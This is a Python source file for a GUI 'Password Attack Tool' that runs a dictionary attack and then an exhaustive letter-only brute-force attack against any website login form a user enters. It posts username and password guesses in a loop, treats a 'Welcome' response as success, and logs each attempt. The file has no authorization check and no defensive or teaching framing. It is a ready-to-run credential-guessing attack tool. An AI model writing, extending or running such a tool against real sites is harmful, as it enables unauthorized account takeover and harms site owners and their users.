import requests
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import itertools
import string
import threading
import time

def start_attack():
    url = url_entry.get().strip()
    username = username_entry.get().strip()
    password_file = file_entry.get().strip()
    brute_force_length = int(length_entry.get() or 5)

    if not url or not username:
        messagebox.showerror("Error", "Please enter the website URL and username")
        return

    passwords = []
    if password_file:
        try:
            with open(password_file, "r") as file:
                passwords = file.read().splitlines()
        except Exception as e:
            messagebox.showerror("Error", str(e))
            return

    progress_bar.start()
    thread = threading.Thread(target=attack_sequence, args=(url, username, passwords, brute_force_length))
    thread.start()

def attack_sequence(url, username, passwords, brute_force_length):
    for password in passwords:
        if try_login(url, username, password):
            progress_bar.stop()
            return
    brute_force_attack(url, username, brute_force_length)
    progress_bar.stop()

def try_login(url, username, password):
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data)
        log_attempt(username, password, response.status_code)
        result_text.insert(tk.END, f"Trying: {password}...\n")
        result_text.update()
        if "Welcome" in response.text:
            messagebox.showinfo("Success", f"The correct password was found: {password}")
            return True
    except Exception as e:
        messagebox.showerror("Error", str(e))
    return False

def brute_force_attack(url, username, length):
    messagebox.showinfo("Brute Force", "Dictionary attack failed. Starting brute force attack...")
    chars = string.ascii_letters  # A-Z + a-z
    for password in itertools.product(chars, repeat=length):
        password = ''.join(password)
        if try_login(url, username, password):
            return
    messagebox.showinfo("Finished", "Valid password not found")

def browse_file():
    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    file_entry.delete(0, tk.END)
    file_entry.insert(0, filename)

def log_attempt(username, password, status_code):
    with open("attack_log.txt", "a") as log_file:
        log_file.write(f"Attempt: {username} | {password} | Status: {status_code}\n")

# Create application window
root = tk.Tk()
root.title("Password Attack Tool")
root.geometry("450x550")
root.configure(bg="#1e1e2e")

style = ttk.Style()
style.configure("TButton", foreground="white", background="#3498db", font=("Arial", 12))
style.configure("TLabel", foreground="white", background="#1e1e2e", font=("Arial", 12))
style.configure("TEntry", font=("Arial", 12))

frame = tk.Frame(root, bg="#1e1e2e")
frame.pack(pady=10)

# URL input
ttk.Label(frame, text="Website URL:").grid(row=0, column=0, sticky='w')
url_entry = ttk.Entry(frame, width=40)
url_entry.grid(row=0, column=1, pady=5)

# Username input
ttk.Label(frame, text="Username:").grid(row=1, column=0, sticky='w')
username_entry = ttk.Entry(frame, width=40)
username_entry.grid(row=1, column=1, pady=5)

# Password file input
ttk.Label(frame, text="Dictionary File:").grid(row=2, column=0, sticky='w')
file_entry = ttk.Entry(frame, width=30)
file_entry.grid(row=2, column=1, pady=5, sticky='w')
ttk.Button(frame, text="Browse", command=browse_file).grid(row=2, column=2, padx=5)

# Brute force length
ttk.Label(frame, text="Brute Force Length:").grid(row=3, column=0, sticky='w')
length_entry = ttk.Entry(frame, width=10)
length_entry.insert(0, "5")
length_entry.grid(row=3, column=1, pady=5)

# Start attack button
ttk.Button(root, text="Start Attack", command=start_attack).pack(pady=10)

# Progress bar
progress_bar = ttk.Progressbar(root, mode="indeterminate")
progress_bar.pack(fill=tk.X, padx=10, pady=5)

# Results display
ttk.Label(root, text="Results:").pack(pady=5)
result_text = tk.Text(root, height=10, width=50, bg="#ecf0f1", font=("Arial", 10))
result_text.pack(pady=5)

root.mainloop()